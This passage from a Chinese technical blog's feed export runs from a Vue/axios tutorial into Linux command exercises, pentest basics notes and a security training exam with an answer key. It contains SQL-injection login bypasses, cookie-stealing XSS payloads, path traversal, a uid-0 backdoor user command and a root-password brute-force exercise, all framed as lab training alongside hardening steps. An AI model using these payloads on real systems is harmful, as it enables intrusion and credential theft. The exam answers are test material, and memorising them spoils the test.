&quot;application/jsoncharset=UTF-8&quot;; // 创建一个axios实例 const instance = axios.create(); instance.defaults.headers.post[&quot;Content-Type&quot;] = &quot;application/jsoncharset=UTF-8&quot;; axios.interceptors.request.use = instance.interceptors.request.use; // http request 拦截器 instance.interceptors.request.use( config =&gt; { if (store.state.token) { config.headers.Authorization = `token ${store.state.token}`.replace( /(^&quot;)|(&quot;$)/g, &quot;&quot; ); } return config; }, error =&gt; { return Promise.reject(error); } ); // http response 拦截器 instance.interceptors.response.use( response =&gt; { return response; }, error =&gt; { if (error.response) { switch (error.response.status) { case 401: store.dispatch(&quot;UserLogout&quot;); router.replace({ path: &quot;login&quot;, query: { redirect: router.currentRoute.fullPath } }); } } return Promise.reject(error.response); } ); export default { // POST PostData(data) { return instance.post(&quot;/api/postData&quot;, data); }, // GET GetData() { return instance.get(&quot;/api/user/getData&quot;); } }; 在 Vue 组件内调用src/pages/Home.vue&lt;template&gt; &lt;div&gt; &lt;!-- ... ... --&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: &#39;Home&#39;, data: { return { fromData: [ // ... ... ] } }, methods: { post () { const opt = this.fromData this.$api.PostData(opt) .then(({data}) =&gt; { // ... ... }) .catch((err) =&gt; { console.log(err) }) } } created () { this.$api.GetData() .then(({data}) =&gt; { // ... ... }) .catch((err) =&gt; { console.log(err) }) } } &lt;/script&gt; 规范性这里只举例 .vue 文件 script 模块中,各个函数的书写顺序,更多的规范性请查询文档 风格指南export default { name: &quot;&quot;, // 组件名字 props: [ // 继承父组件数据 &quot;&quot; ], data() { return { // 该组件数据 }; }, watch: { // 于观察 Vue 实例上的数据变动。对应一个对象,键是观察表达式,值是对应回调。值也可以是方法名,或者是对象,包含选项 }, computed: { // 相当于属性的一个实时计算,如果实时计算里关联了对象,那么当对象的某个值改变的时候,同事会出发实时计算 }, methods: { // 该组件的方法 }, filter: { // 过滤器 }, beforeRouteUpdate(to, from, next) { // 在当前路由改变,但是该组件被复用时调用 }, created() { // 在 vue 1.0 中起到初始化数据作用,在 vue 2.0 之后推荐改用 computed }, mounted() { // 在这发起后端请求,拿回数据,配合路由钩子做一些事情 }, components: { // 组件 } }; 在 vue 中引入 markdown安装相关依赖npm i -D text-loader npm i -S marked github-markdown-css 配置 webpackbuild/webpack.base.conf.jsmodule.exports = { module: { rules: [ { test: /.md$/, loader: &#39;text-loader&#39; } } } } vue.config.jsmodule.exports = { chainWebpack: config =&gt; { config.module .rule(&#39;test&#39;) .test(/\.md$/) .use(&#39;test-loader&#39;) .loader(&#39;test-loader&#39;) } } 编写 vue 文件&lt;template lang=&quot;html&quot;&gt; &lt;div&gt; &lt;div class=&quot;article markdown-body&quot; v-html=&quot;compiledMarkdown&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import marked from &#39;marked&#39; import versionLog from &#39;./versionLog.md&#39; import &#39;github-markdown-css/github-markdown.css&#39; export default { name: &#39;VersionLog&#39;, data () { return { context: versionLog } }, computed: { compiledMarkdown () { return marked(this.context, { sanitize: true }) } } } &lt;/script&gt; 基于 Markdown 的幻灯片导入 text-loader 上一节已经说明过了，这里就不重复了github vue-mark-displaynpm i vue-mark-display usagedemo.md# Hello World ---- This is Vue Mark Display demo.vue&lt;template&gt; &lt;mark-display :markdown=&quot;markdown&quot; @title=&quot;setTitle&quot; keyboard-ctrl url-hash-ctrl auto-font-size auto-blank-target &gt;&lt;/mark-display&gt; &lt;/template&gt; &lt;script&gt; import MarkDisplay from &quot;vue-mark-display&quot;; import markdown from &quot;./demo.md&quot;; export default { components: { MarkDisplay }, data() { return { markdown }; }, methods: { setTitle({ title }) { document.title = title; } } }; &lt;/script&gt;]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 命令练习]]></title>
    <url>%2Farchives%2F8183b2ea.html</url>
    <content type="text"><![CDATA[简单的一些 Liunx 命令练习【文件的压缩和解压缩】使用 tar 命令将 /etc 目录打包至 /tmp 目录下（仅打包,不压缩）,将打包后的文件,以 gzip 方式压缩【共两条命令】tar -cvf /tmp/etc.tar /etc gzip /tmp/etc.tar 【创建软链接和硬链接】给系统文件 /etc/profile 创建一个软链接 lnsprofile 和一个硬链接 lnhprofile【共两条命令】ln -s /etc/profile ./lnsprofile ln /etc/profile ./lnhprofile 【为文件设置隐藏属性】为文件 test 设置隐藏属性,要求其只能无法写入数据,也无法删除它【共一条命令】chattr +a test # or chattr +i test 【创建目录和删除目录】创建目录 ./test/2017/6/25,并切换目录至 ./test/2017/6,删除空目录 ./25（不能使用 rm -rf）【共三条命令】mkdir -p ./test/2017/6/25 cd ./test/2017/6 rmdir ./25 查看当前所在的目录【共一条命令】pwd 查看当前目录下有哪些文件或目录（包括隐藏文件）【共一条命令】ls -la 【普通用户提权】普通用户切换成 root 超级用户【举例两个】sudo su # or su - # or sudo -s 【创建用户和用户组】创建一个用户 stuxxx,其家目录为 /home/stu,备注信息为 “this is student,ID is xxxxxx”,登录 shell 为 /sbin/nologin,并设置登陆密码【共三条命令】useradd -d /home/stu -m -c &quot;this is student,ID is xxxxxx&quot; -s /sbin/nologin -p &quot;&quot; stuxxx 创建一个 uid 为 0 的用户 student【共一条命令】useradd -o -u 0 student 创建用户组 test【共一条命令】groupadd test 【用户管理】锁定用户 stuxxx,使其不能登陆系统【共一条命令】usermod -s /sbin/nologin stu2xxx # or passwd -l stu2xxx 【新建文件】新建一个文件 file,添加内容 “this is text,ID is xxxxxx”,设置其权限为 000【共三条命令】touch file echo &quot;this is text,ID is xxxxxx&quot; &gt; file chmod 000 file 【文件的快速搜索】在 /etc 目录下搜索 apache、ssh、ftp 的配置文件【共三条命令】find /etc -type f -iname &#39;*apache2.*&#39; find /etc -type f -iname &#39;*ssh.*&#39; find /etc -type f -iname &#39;*ftp.*&#39; 【文件的查看和快速定位】查看 /etc/passwd 文件和 /etc/shadow 文件,并使用 grep 过滤出 student 用户的信息【共两条命令】cat /etc/passwd | grep &#39;student&#39; cat /etc/shadow | grep &#39;student&#39; 【更改目录或者文件的属性】将目录 ./test/* 的所有者和所有组修改成 student【共一条命令】chown -R student:student ./test/ 【系统环境变量的查看与配置】查看当前的系统环境变量配置【共两条命令】env # or echo $PATH 将 /tmp 目录添加至系统 $PATH 变量中【共一条命令】PATH=$PATH:/tmp 【iptables 规则】设置 iptables 规则,只允许 80 端口和 22 端口通过防火墙【共两条命令】iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -p tcp --dport 80 -j ACCEPT]]></content>
      <categories>
        <category>testing</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Command</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透基础知识]]></title>
    <url>%2Farchives%2F67941abf.html</url>
    <content type="text"><![CDATA[整理的渗透所需的一些基础知识HTML 表单基础该表单是提交给哪个文件进行处理的（查看 action 属性值）向后端程序提交的参数是什么（查看 name 属性）SQL 数据库查询语句基础查询返回所有的结果select * from users; 条件查询select * from users where uame=&#39;$uname&#39;; union 合并多个查询结果select * from users union select * from msgs; … …万能用户名或者万能密码第一种select * from users where uame=&#39;&#39; or &#39;&#39;=&#39;&#39; and passwd=$passwd; 第二种select _from users where uame=&#39;&#39; union select_ from users and passwd=$passwd; 第三种select * from users where uame=$uname and passwd=&#39;&#39; or &#39;&#39;=&#39;&#39;; … …使用 PDO 进行防注入基础允许长连接PDO::ATTR_PERSISTENT=&gt;true 不允许使用预处理语句PDO::ATTR_EMULATE_PREPARE=&gt;false PDO 连接$pdh=new PDO(host=&#39;127.0.0.1:1433&#39;,user=&#39;sa&#39;,password=&#39;root&#39;); 预处理 SQL 查询语句$stmt=$dbh-&gt;prepare($sql) 填充 SQL 语句中的占位符$stmt-&gt;execute(array(...,...,....)); SQL 占位符（如：select * from users where uname=? and passwd=?;）select * from users where uname=? and passwd=?; … …Wireshark 抓包熟练使用 Wireshark 这款软件熟练掌握过滤器的写法（如：tcp、udp、icmp、mac … …）知道各个协议的包结构、包头、包尾… …审查代码的能力HTML 源文件内容（通过右键网页 –&gt; 查看源文件）PHP 代码（了解代码逻辑以及书写规范,特别是对函数名的记忆）PYTHON 代码（快速读懂代码意思,特别是要从 main 函数入手去查看）C 语言代码（从代码中分析出来,该代码的意思以及各个函数的逻辑）… …各个 WEB 漏洞的利用能力SQL 注入（通过万能用户名和万能密码来获取一定的 webshell）命令注入（特别是 PHP 中的 exec 和 system 函数也能获取到一定的 webshell）文件包含和目录遍历（通过 ../../../../... .../flag.txt 来获取文件）… …Liunx 服务的安全配置SSH（禁止 root 登录；禁止空密码登录；禁止密钥登录 … …）TELNET（禁止 root telnet；禁用 telnet … …）VSFTP（不允许普通用户登录 ftp；禁止匿名用户登录 ftp … …）HTTPD（禁止回显 banner 信息；严格控制目录权限 … …）… …PHP 安全配置开启安全模式safe_mode = on 禁用函数disable_functions = system,exec,eval,shell_exec,phpinfo,... ... 禁止 SQL 注入magic_quotes_gpc = On PYTHON 渗透脚本基础了解 scapy 这一模块（特别是在构造数据包的时候该怎么写）了解 dpkt 封装或者拆解网络协议包了解 socket 编程能够从 help 这一帮助函数中获取到其他函数的使用方法拥有快速阅读脚本的能力和代码逻辑思维… …Liunx 常用命令findfind / -iname * | xargs grep –i &#39;*key*&#39; grepgrep &#39;*key*&#39; ./keystring.txt netstatnetstat –tulnp 11.4 kill -9 [pid] 11.5 chattr +i /etc/passwd killkill -9 [pid] chattrchattr +i /etc/passwd /etc/shadow useradduseradd -o -u 0 test WEB 漏洞训练平台DVWA 【DVWA】Web For Pentester 【Web For Pentester II】(请自行安装镜像,安装时请选择”其他 Liunx 3.x 内核 64 位”)ZVulDrill 【ZVulDrill】(请自行准备 PHP 环境)… …网络协议原理Tcp 三次握手和四次挥手Icmp 发包以及回包Mac 防洪原理ARP 发广播包,ARP 欺骗Dtp 生成树攻击原理… …关于 PYTHON 的网络渗透编程ARP 扫描import socket # or from scapy.all import * ARP 欺骗、ARP 监控from scapy.all import * OS 扫描import nmap Mac 防洪import socket # or from scapy.all import * mssql 数据库密码爆破import pymssql 跨越 VlAN 攻击from scapy.all import * Dtp 攻击from scapy.all import * … …]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Liunx</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全渗透基础测试题]]></title>
    <url>%2Farchives%2Fc4a1452e.html</url>
    <content type="text"><![CDATA[安全渗透基础测试题,考点涉及到 HTML、PHP、MySQL、SQL 注入、XSS 攻击、CTF、Python 等随机题库代码将以下代码保存成 1.py 文件,运行之,根据随机到的编号做对应的题目#!/usr/bin/python # -*- coding:utf-8 -*- import random I=[&quot;I1&quot;,&quot;I2&quot;] # SQL XSS PHP JavaScript HTML II=[&quot;II1&quot;,&quot;II2&quot;] # Python III=[&quot;III1&quot;,&quot;III2&quot;] # Liunx IV=[&quot;IV1&quot;,&quot;IV2&quot;] # PHP MySQL V=[&quot;V1&quot;,&quot;V2&quot;] # CTF VI=[&quot;VI1&quot;,&quot;VI2&quot;] # CTF result=[] i = random.sample(I,1) result.append(i) ii = random.sample(II,1) result.append(ii) iii = random.sample(III,1) result.append(iii) iv = random.sample(IV,1) result.append(iv) v = random.sample(V,1) result.append(v) vi = random.sample(VI,1) result.append(v) print result 注意要点认真读题,使用相关的虚拟环境,需标明做的题目的任务名运行脚本,会得到六个任务的编号,按编号答题,每个任务互不干扰按要求提交相关 FLAG 字符串或者 Wireup 或者相关截图每个任务至少 3 张截图,只需截取关键步骤即可,题目有要求截图的不可省略CTF 题辅以 Wireup 提交,Wireup 只需写出关键步骤答案请新建一个文档,写在文档里进行提交时间控制在 6 小时以内虚拟环境 =&gt; 【Ubuntu - server.7z】（链接：http://pan.baidu.com/s/1c1QLXo0 密码：vb0k）任务书【I1：SQL 注入漏洞检测】分值【50 分】虚拟环境：Ubuntu-server系统搭建 PHP + MySQL 环境；账号：root；密码：root考点：PHP 代码审核；MD5 密码破解；排序型 SQL 注入漏洞检测将虚拟机环境还原快照至 WEB,登入系统,并使用 find 命令全盘寻找 login.php 文件绝对路径,将其绝对路径作为 FLAG1 字符串提交(形式：FLAG1=login.php 文件绝对路径)。【5 分】答案：FLAG1=/var/www/html/login.php阅读 login.php 文件,寻找变量将会提交至哪个 PHP 文件,将该提交数据的文件绝对路径作为 F1；寻找 login.php 文件中的将会被提交的变量 F2,F3,F4。提交 FLAG2 字符串(形式：FLAG2=F1;F2;F3;F4)。【12 分】答案：FLAG2=/var/www/html/check.php;username;password;submit阅读 login.php 文件相关的 PHP 文件,寻找连接的 MySQL 数据库名 F1,数据库账号 F2,数据库密码 F3,用户信息存储的数据表 F4。提交 FLAG3 字符串(形式：FLAG3=F1;F2;F3;F4)。【12 分】答案：FLAG3=czjt;root;root;users使用上一题的账号和密码进入数据库,寻找允许登入 WEB 漏洞系统的账号 F1 和解密之后的密码 F2,MD5 解密可访问 md5.php。提交 FLAG4 字符串(形式：FLAG4=F1;F2)。【8 分】答案： FLAG4=admin;@dmin点击 SQL Injection 进入 SQL 注入测试页,对其页面进行 SQL 注入测试,使其数据以 age 字段为倒序排列形式。提交 FLAG5 字符串(形式：FLAG5=?order=payload)(tip：payload 必须含有正序排列或倒序排列 SQL 查询语句关键词,字段名必须含有反引号；辅以截图证明)。【5 分】答案： FLAG5=?order=age` desc%23继续对其页面进行 SQL 注入测试,使其数据先以 name 字段为首要字段倒序排列,再以 age 字段为次要字段正序排列。提交 FLAG6 字符串(形式：FLAG6=?order=payload)(tip：payload 必须含有正序排列和倒序排列 SQL 查询语句关键词,字段名必须含有反引号；辅以截图证明)。【8 分】答案： FLAG6=?order=namedesc,age` asc%23【I2：XSS 攻击与防护】分值【50 分】虚拟环境：Ubuntu-server账号：root；密码：root考点：DOM 型 XSS 攻击；PHP 安全配置；HttpOnly 的设置；PHP、JavaScript 代码编写将虚拟机环境还原快照至 WEB,使用账号 admin,密码 @dmin 登录 login.php,点击 DOM Based XSS 进入 DOM 型 XSS 检测页面,使用 payload1 可以使浏览器执行弹窗事件,弹窗内容为 XSS。提交 FLAG1 字符串(形式：FLAG1=xss.php#payload1)(tip：辅以截图证明)。【5 分】答案： FLAG1=xss.php#%3cscript%3ealert(%27xss%27)%3c%2fscript%3e继续检测 DOM 型 XSS,使用 payload2 可以获取当前的 cookie 信息。提交 FLAG2 字符串(形式：FLAG2=xss.php#payload2)。【5 分】答案： FLAG2=xss.php#%3cscript%3ealert(document.cookie)%3c%2fscript%3e访问 phpinfo.php 页面,获取 php.ini 的绝对路径 F1,在 php.ini 中配置全局的 HttpOnly,设该该行配置项为 F2。提交 FLAG3 字符串(形式：FLAG3=F1;F2)。【8 分】答案： FLAG3=/etc/php/7.0/apache2/php.ini;session.cookie_httponly = true在 /var/www/html 中寻找设置 cookie 的 PHP 页面,设该页面的绝对路径为 F1,修改设置 cookie 的 HttpOnly 属性,使其不再被 JavaScript 脚本获取,设修改 cookie 属性所在行的 PHP 代码为 F2,修改之后,清除浏览器存储的 cookie 信息,再次使用 payload2 获取 cookie 信息,可以获取到则 F3=TRUE,不可以获取到则 F3=FALSE。提交 FLAG4 字符串(形式：FLAG4=F1;F2;F3)(tip：辅以截图证明)。【12 分】答案： FLAG4=/var/www/html/check.php;setcookie(“uname”,$uname,time()+3600,NULL,NULL,NULL,true);;FALSE将 xss.php 页面中的所有注释去掉,完善该代码,使其能够抵御 DOM 型 XSS 攻击。提交 FALG5 字符串。(形式：FLAG5=F1,F2)。【8 分】答案： FLAG5=safeStr;name将 xss.php 页面中的所有注释去掉,完善该代码,使其能够抵御 DOM 型 XSS 攻击。提交 FALG6 字符串。(形式：FLAG6=F3,F4)。【8 分】答案： FLAG6=str;replace再次使用 payload1 进行 DOM 型 XSS 攻击,可以执行 JavaScript 弹窗到则 FLAG7=TRUE,不可以执行 JavaScript 弹窗则 FLAG7=FALSE。。提交 FALG6 字符串。(形式：FLAG7=TRUE or FALSE)(tip：辅以截图证明)。【4 分】答案： FLAG7=FALSE【II1：本地操作系统登录密码爆破】分值【50 分】虚拟环境：Ubuntu-server；自备虚拟环境：kali系统搭建 Python 环境；账号：root；密码：未知考点：Python 代码审核以及完善；liunx 密码复杂性配置；使用 Python 爆破用户登录密码将虚拟机环境还原快照至操作系统密码爆破,在 root 的家目录里有个名为 liunx_passwd.py 代码,代码功能为爆破当前操作系统中的 root 密码。使用命令 F1 (tip：不得数字形式表示权限)可为该文件添加执行权限,设 F2 (tip:以数字形式表示权限)为执行 F1 之后该文件的权限,在 /etc/shadow 文件中寻找 root 的加密密码 F3(tip：包含第一个 $ 与包含最后一个 $ 之间的字符串)。提交 FLAG1 字符串(形式：FLAG1=F1;F2;f3)。【8 分】答案： FLAG1=chmod +x ./liunx_passwd.py;755;$6$Hr1Yyz9f$完善 liunx_passwd.py 代码,破解密码字典使用根目录下 password.lst。提交 FLAG2 字符串。(形式：FLAG2=F1;F2)。【8 分】答案： FLAG2=”/etc/shadow”;”/password.lst”完善 liunx_passwd.py 代码,破解密码字典使用根目录下 password.lst。提交 FLAG3 字符串。(形式：FLAG3=F3;F4)。【8 分】答案： FLAG3=passwords;passwd完善 liunx_passwd.py 代码,破解密码字典使用根目录下 password.lst。提交 FLAG4 字符串。(形式：FLAG3=F5;F6;F7)。【10 分】答案： FLAG4=username;rootpassword;password执行 liunx_passwd.py 代码,将结果返回的最后一行作为 FLAG5 提交。(形式：FLAG5=返回的最后一行)(tip：辅以截图证明)。【6 分】答案： FLAG5=I find it, root password is p@ssw0rd修改 /etc/pam.d/system-auth 文件中的密码复杂性,最少不同字符 3 个,最小密码长度为 8,最少大写字母为 1。将以上设置的该行作为 FLAG6 提交。(形式：FLAG6=设置的该行内容)。【6 分】答案： FLAG6=password requisite pam_cracklib.so difok=3 minlen=8 ucredit=-1按照密码复杂性要求重新设置密码,并再次执行 liunx_passwd.py 代码,将结果返回的最后一行作为 FLAG7 提交。(形式：FLAG7=返回的最后一行)(tip：辅以截图证明)。【4 分】答案： FLAG7=serching is failed【II2：Python 编码与转码】分值【50 分】虚拟环境：Ubuntu-server；系统搭建 Python 环境；账号：root；考点：Python 代码编写基础；Python 编码、Python 转码将虚拟机环境还原快照至 Python,编写 Python 代码,实现功能：URL 的编码和转码,base64 的编码和转码,提交 python 代码。【15 分】编写 Python 代码,实现功能：将 IP 地址转换成 16 进制数,将 IP 地址从主机字节序转换成网络序,将网络序转回主机字节序,提交 python 代码。【15 分】编写 Python 代码,实现功能：MD5 加密(要求生成 32 位大小写,16 位大小写四种情况),提交 python 代码。【20 分】答案： 该任务不提供答案,请自行百度【III1：Liunx 服务安全配置】分值【50 分】虚拟环境：Ubuntu-server；自备虚拟环境：kali系统搭建 SSH 服务、Apache 服务、FTP 服务；账号：root；密码：root考点：Ubuntu 下的 SSH 服务、Apache 服务、FTP 服务的简单安全配置将虚拟机环境还原快照至服务安全配置,使用 find 命令全盘搜索 SSH 服务主配置文件 F1,Apache 服务主配置文件 F2,FTP 服务主配置文件 F3,将其服务配置文件绝对路径作为 FLAG1 字符串提交(形式：FLAG1=F1;F2;F3)。【8 分】答案： FLAG1=/etc/ssh/sshd_config;/etc/apache2/apache2.conf;/etc/vsftpd.conf配置 SSH 服务禁止 root 用户登录,设该行的配置为 F1,使用 kali 进行 SSH 登录测试,设登录结果的最后一行为 F2。提交 FLAG2 字符串。(形式：FLAG2=F1;F2)(tip：辅以截图证明)。【8 分】答案： FLAG2=PermitRootLogin no;Permission denied, please try again.创建用户 user,设创建用户命令为 F1,配置只允许 user 用户登录 SSH,设该行的配置为 F2,使用 kali 进行 SSH 登录测试,设登录之后即输入密码之后的第一行为 F3。提交 FLAG3 字符串。(形式：FLAG3=F1;F2;F3)。【10 分】答案： FLAG3=addusser user;AllowUsers user;user@ubuntu:~$获取 Apache 的版本号 F1,配置 Apache 服务安全,使其不再显示版本号信息,设该行的配置为 F2,设该配置文件的绝对路径为 F3,设 404 页面返回的文本内容为 F4(tip：F4 为截图)。提交 FLAG4 字符串。(形式：FLAG4=F1;F2;F3;F4)。【12 分】答案： FLAG4=2.4.18;ServerSignature Off;/etc/apache2/conf-available/security.conf;以截图为准创建目录 /home/www,修改 Apache 默认网站目录为 /home/www,设该行的配置为 F1,设该配置文件的绝对路径为 F2。提交 FLAG5 字符串。(形式：FLAG5=F1;F2)。【6 分】答案： FLAG5=DocumentRoot /home/www;/etc/apache2/sites-available/000-default.conf使用匿名用户登录 FTP 服务,设此时登录之后即输入密码之后的第一行为 F1,配置禁止匿名用户登录,设该行的配置为 F2,再次使用匿名用户登录 FTP 服务,设此时登录之后即输入密码之后的第一行的显示结果为 F3。提交 FLAG6 字符串。(形式：FLAG6=F1;F2;F3)(tip：辅以截图证明)。【6 分】答案： FLAG6=230 Login successful.;anonymous_enable=NO;530 Login incorrect.【III2：Liunx 基础命令和基础加固】分值【50 分】虚拟环境：Ubuntu-server；考点：Liunx 基础命令的使用将虚拟机环境还原快照至初始状态,创建一个测试用户 test,设创建用户命令为 F1,创建一个测试用户组为 testGroup,设创建用户组命令为 F2,设置 test 用户的附属组为 testGroup,设修改用户属性命令为 F3。提交 FLAG1 字符串。(形式：FLAG1=F1;F2;F3)。【8 分】答案： FLAG1=addusser test;groupadd testGroup;usermod -G testGroup test配置 test 用户能够无密码切换至 root 用户,设配置文件的绝对路径为 F1,设该行配置项为 F2,切换至 test 用户,命令 F3 可以使 test 用户无密码切换至 root 用户。提交 FLAG2 字符串(形式：FLAG2=F1;F2;F3)(tip：辅以截图证明)。【10 分】答案： FLAG2=test ALL=(ALL:ALL) ALL;/etc/sudoers;sudo su 或者 sudo -s配置普通用户不得使用 su 切换至 root 用户,设配置文件的绝对路径为 F1,设该行配置项为 F2。提交 FLAG3 字符串。(形式：FLAG3=F1;F2)。【8 分】答案： FLAG3=/etc/pam.d/su;auth required pam_wheel.soroot 目录中有个文件是专门用来存放 BASH 历史操作命令的文件,设该文件的绝对路径为 F1,命令 F2,F3 可以使该文件不再保存 BASH 历史操作。提交 FLAG4 字符串。(形式：FLAG4=F1,F2,F3)。【8 分】答案： FLAG4=/root/.bash_history;rm /root/.bash_history;ln -s /dev/null /root/.bash_history命令 F1 可以查看当前的网络状况,命令 F2 可以查看当前进程,命令 F3 可以查看当前的网卡信息。提交 FLAG5 字符串。(形式：FLAG5=F1,F2,F3)。【8 分】答案： FLAG5=netstat -tulnp;ps -au;ifconfig命令 F1 可以使 /etc/passwd 不被删除,不被更改,命令 F2 可以查看 /etc/passwd 当前的特殊权限,随意创建一个用户,设其报错信息为 F3(tip:F3 为截图)。提交 FLAG6 字符串。(形式：FLAG5=F1,F2,F3)(tip：辅以截图证明)。【8 分】答案： FLAG6=chattr +i /etc/passwd;lsattr /etc/passwd;以实际截图为准【IV1：PHP + MySQL 服务安全配置】分值【50 分】虚拟环境：Ubuntu-server；自备虚拟环境：kali系统搭建 PHP + MySQL 环境；账号：root；密码：root考点：PHP 安全配置；MySQL 安全配置；MySQL 本地文件读取将虚拟机环境还原快照至 PHP + MySQL 服务安全配置,访问网站中的 phpinfo.php 文件,获取 PHP 的版本号 F1,获取 php.ini 的绝对路径 F2。提交 FLAG1 字符串。(形式：FLAG1=F1;F2)。【8 分】答案： FLAG1=7.0.22;/etc/php/7.0/apache2/php.ini修改 php.ini 文件,开启 php 的安全模式,设该配置项为 F1,设置安全模式下执行程序主目录为 /var/www/html,设该配置项为 F2。提交 FLAG2 字符串。(形式：FLAG2=F1;F2)。【8 分】答案： FLAG2=safe_mode = on;safe_mode_exec_dir = /var/www/html修改 php.ini 文件,禁用函数 system,passthru,exec,shell_exec,popen,phpinfo,将该配置项作为 FLAG3 提交。(形式：FLAG3=禁用函数配置项)。【4 分】答案： FLAG3=disable_functions = system,passthru,exec,shell_exec,popen,phpinfo关闭 PHP 版本信息在 http 头中的泄漏,设该配置项为 F1,配置防止 SQL 注入,设该配置项为 F2。提交 FLAG4 字符串。(形式：FLAG4=F1;F2)。【8 分】答案： FLAG4=expose_php = Off;magic_quotes_gpc = On连接本地 MySQL 数据库,账号密码皆为 root,执行 SQL 查询语言获取 MySQL 的版本号信息,设查询语句为 F1,设 MySQL 的版本号信息为 F2。提交 FLAG5 字符串。(形式：FLAG5=F1;F2)(tip：辅以截图证明)。【8 分】答案： FLAG5=select version();;5.7.19-0ubuntu0.16.04.1root 家目录中有一个文件 user.txt,MySQL 数据库中有个名为 czjt 的数据库,数据库 czjt 中有张名为 users 的数据表,想办法通过 load data local infile 的相关 SQL 查询命令将 user.txt 文本内容导入至数据表。将该 SQL 查询命令作为 FLAG6 提交。(形式：FLAG6=SQL 读取文件命令)。【4 分】答案： FLAG6=load data local infile ‘/root/user.txt’ into table czjt.users fields terminated by ‘,’;禁止 MySQL 对本地文件存取,设该行配置项为 F1,再次进行本地文件读取,设报错 ERROR 该行为 F2(F2 为截图),设改配置文件的绝对路径为 F3。提交 FLAG7 字符串。(形式：FLAG7=F1;F2;F3)。【10 分】答案： FLAG7=local-infile=0;以实际截图为准;/etc/mysql/conf.d/mysql.cnf【IV2：MySQL 基础操作和基础加固】分值【50 分】虚拟环境：Ubuntu-server；自备虚拟环境：kali账号：root；密码：root考点：SQL 查询语句；MySQL 加固将虚拟机环境还原快照至 PHP + MySQL 服务安全配置,连接本地 MySQL 数据库,设连接命令为 F1,账号密码皆为 root,执行 SQL 查询语言获取 MySQL 的版本号信息,设查询语句为 F2,设 MySQL 的版本号信息为 F3。提交 FLAG1 字符串。(形式：FLAG1=F1;F2;F3)。【10 分】答案： FLAG1=mysql -p;`select version();;5.7.19-0ubuntu0.16.04.1SQL 语句 FLAG2 可以修改 root 密码为 p@ssw0rd。提交 FLAG2 字符串。(形式：FLAG2=修改 root 密码的 SQL 语句)。【5 分】答案： FLAG2=update mysql.user set password=password(‘p@ssw0rd’) where user=’root’;SQL 语句 F1 可以获取当前的所有数据库,SQL 语句 F2 可以切换数据库至 czjt,SQL 语句 F3 可以查看 czjt 中有那些表,SQL 语句 F4 可以查看 users 表中的所有数据。(形式：FLAG3=F1;F2;F3;F4)。【12 分】答案： FLAG3=show databases;;use czjt;;show tables;;select from users;或者 select from czjt.users;使用 find 命令全盘搜索 MySQL 的主配置文件,提交 FLAG4 字符串。(形式：FLAG4=MySQL 的主配置文件的绝对路径)。【5 分】答案： FLAG4=/etc/mysql/my.cnf使用 kali 远程连接该 MySQL 数据库,设连接命令为 F1(F1 为截图),配置 MySQL 服务禁止被远程连接,设该配置项为 F2,再次远程连接将,设报错信息为 F3(F3 为截图)。(形式：FLAG5=F1,F2,F3)(tip：辅以截图证明)。【10 分】答案： FLAG5=以实际截图为准;skip-networking;以实际截图为准系统中有个文件是专门用来存放 MySQL 历史操作命令的文件,设该文件的绝对路径为 F1,命令 F2,F3 可以使该文件不再保存 MySQL 历史操作命令。提交 FLAG6 字符串。(形式：FLAG6=F1,F2,F3)。【8 分】答案： FLAG6=/root/.mysql_history;rm /root/.mysql_history;ln -s /dev/null /root/.mysql_history【V1：密码学、隐写术】分值【50 分】虚拟环境：Ubuntu-server；自备虚拟环境：kali账号：root；密码：root考点：密码学、隐写术 此任务提交 Wireup将虚拟机环境还原快照至 WEB,访问 ctf.php,完成 Crypto10,提交 FLAG1 字符串。【10 分】访问 ctf.php,完成 Crypto20,提交 FLAG2 字符串。【15 分】访问 ctf.php,完成 Stegano10,提交 FLAG3 字符串。【10 分】访问 ctf.php,完成 Stegano20,提交 FLAG4 字符串。【15 分】答案： 该任务里的题目皆摘录至实验吧,不提供 Wireup【V2：安全杂项、编程】分值【50 分】虚拟环境：Ubuntu-server；自备虚拟环境：kali账号：root；密码：root考点：安全杂项、python 编程 此任务提交 Wireup将虚拟机环境还原快照至 WEB,访问 ctf.php,完成 misc10,提交 FLAG5 字符串。【10 分】访问 ctf.php,完成 misc20,提交 FLAG6 字符串。【15 分】访问 ctf.php,完成 progra10,提交 FLAG7 字符串。【10 分】访问 ctf.php,完成 progra20,提交 FLAG8 字符串。【15 分】答案： 该任务里的题目皆摘录至实验吧,不提供 Wireup【VI1：网站综合渗透】分值【50 分】考点： SQL 注入；菜刀的使用；获取 shell；HASH 值暴力破解此任务提交 Wireup访问 我很简单,请不要欺负我,完成该挑战。【50 分】答案： 该任务摘录至 i 春秋,不提供 Wireup【VI2：黑客游戏】分值【50 分】考点：HTML+JavaScript 代码审核、隐写术、编码、SQL 简单注入此任务提交 Wireup访问 黑客游戏,完成所有关卡。【50 分】答案： 该任务不提供答案,请自行百度]]></content>
      <categories>
        <category>testing</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>PHP</tag>
        <tag>WEB</tag>
        <tag>MySQL</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js 利用 Express 结合 MySQL 或者 MongoDB]]></title>
    <url>%2Farchives%2F3d83674d.html</url>
